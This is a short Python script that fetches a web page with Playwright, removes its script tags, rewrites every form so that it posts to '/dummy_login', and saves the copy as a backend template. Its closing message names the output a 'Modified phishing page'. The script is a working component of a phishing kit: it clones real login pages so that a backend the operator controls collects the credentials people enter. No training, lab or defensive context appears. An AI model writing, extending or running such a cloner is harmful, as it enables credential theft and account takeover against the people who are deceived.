from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup

def fetch_and_modify(url):
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        page.goto(url)
        html = page.content()
        browser.close()
    
    soup = BeautifulSoup(html, 'html.parser')

    # Remove all <script> tags
    for script in soup.find_all('script'):
        script.decompose()

    # Modify form actions to dummy route
    for form in soup.find_all('form'):
        form['action'] = '/dummy_login'
        form['method'] = 'POST'

    return str(soup)

if __name__ == "__main__":
    url = input("Enter URL: ")
    modified_html = fetch_and_modify(url)
    with open("../backend/templates/index.html", "w", encoding="utf-8") as f:
        f.write(modified_html)
    print("Modified phishing page saved to backend/templates/index.html")
